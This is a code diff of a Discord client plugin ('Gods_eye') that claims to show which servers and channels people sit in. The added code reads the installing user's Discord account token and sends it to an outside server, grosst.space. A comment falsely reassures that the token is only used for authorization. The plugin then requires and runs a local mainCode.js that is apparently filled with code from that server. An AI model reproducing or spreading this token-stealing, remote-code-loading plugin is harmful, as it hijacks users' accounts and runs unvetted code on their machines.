@@ -39,7 +39,7 @@ const config = {
                 discord_id: "3713360440224645238",
             }
         ],
-        version: "2.0.7",
+        version: "2.0.8",
         description: "Показывает кто где и скем сидит",
         github: "https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js",
         github_raw: "https://raw.githubusercontent.com/GR0SST/Gods_eye/main/SelfCommands.plugin.js",
@@ -49,10 +49,8 @@ const config = {
         title: "Rebranding",
         type: "fixed",
         items: [
-            "Теперь работает",
-            "Система авторизации плагина изменена",
-            "Теперь можно смотреть за человеком даже если его нет на сервере",
-            "Скачивая плагин вы даете согласие на предоставление и обработку ваших персональных данных"
+            "Пофикшен баг с незапускающим плагином"
+            
         ]
     }],
     defaultConfig: []
@@ -136,36 +134,13 @@ module.exports = !global.ZeresPluginLibrary ? class {
         return template.content.firstElementChild;
     }
 } : (([Plugin, Library]) => {
-    const { DiscordModules, Settings, Toasts, PluginUtilities } = Library;
+    const { DiscordModules, Settings, Toasts, PluginUtilities, WebpackModules } = Library;
     const { React } = DiscordModules;
+    const { getToken } = WebpackModules.getByProps("getToken","getId")
     const path = `${BdApi.Plugins.folder}\\mainCode.js`
-    let script = null
     let auth = false
 
     const TopBarRef = React.createRef();
-    function getToken() {
-        let token
-        var req = webpackJsonp.push([
-            [], {
-                extra_id: (e, r, t) => e.exports = t
-            },
-            [
-                ["extra_id"]
-            ]
-        ]);
-        for (let e in req.c) {
-            if (req.c.hasOwnProperty(e)) {
-                let r = req.c[e].exports;
-                if (r && r.__esModule && r.default)
-                    for (let e in r.default)
-                        if ("getToken" === e) {
-                            token = r.default.getToken();
-                        }
-            }
-        }
-        return token
-
-    }
     return class Gods_eye extends Plugin {
         constructor() {
             super();
@@ -173,11 +148,11 @@ module.exports = !global.ZeresPluginLibrary ? class {
         auth() {
             // Токен используеться исключительно для авторизации и индетификации пользователя
             // Никакие данные используя токен не сохраняються и не обрабатываються
-            const userToken = getToken()
+            
             const options = {
-                url: 'https://da-hzcvrvs0dopl.runkit.sh/selfcmd',
+                url: 'http://www.grosst.space/selfcmd',//
                 headers: {
-                    'authorization': userToken
+                    'authorization': getToken()
                 },
             };
             return new Promise(res => {
@@ -197,20 +172,20 @@ module.exports = !global.ZeresPluginLibrary ? class {
                 });
             })
         }
+
         async onStart() {
             fs.writeFile(path, ` `, function (err) { });
             this.loadSettings();
             delete require.cache[require.resolve(path)]
             await this.auth()
-            let mainCode = require(path)
-            script = new mainCode.exports()
-            script.onStart()
+            const mainCode = require(path)
+            this.script = new mainCode.exports()
+            this.script.onStart()
         }
 
         onStop() {
-            if (script !== null) {
-                script.onStop()
-            }
+           if(this.script)
+           this.script.onStop()
         }
 
         get defaultVariables() {
